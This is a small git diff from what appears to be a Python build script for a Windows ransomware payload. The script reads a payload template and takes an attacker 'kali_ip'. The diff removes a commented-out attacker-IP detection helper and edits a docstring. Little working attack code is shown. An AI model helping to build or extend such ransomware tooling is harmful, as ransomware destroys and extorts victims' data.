@@ -4,20 +4,8 @@ import sys
 
 print("[+] Building Windows Ransomware Payload...\n")
 
-# def get_attacker_ip():
-#     """Get local IP address"""
-#     try:
-#         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-#         s.connect(("8.8.8.8", 80))
-#         ip = s.getsockname()[0]
-#         s.close()
-#         return ip
-#     except Exception as e:
-#         print(f"[-] Could not auto-detect IP: {e}")
-#         return "192.168.0.111"  # Default fallback
-
 def build_windows_payload(kali_ip=None):
-    """Build the ransomware payload"""
+    # Build the ransomware payload
     try:
         # Read the Template
         template_path = os.path.join(os.path.dirname(__file__), "payload_template.py")
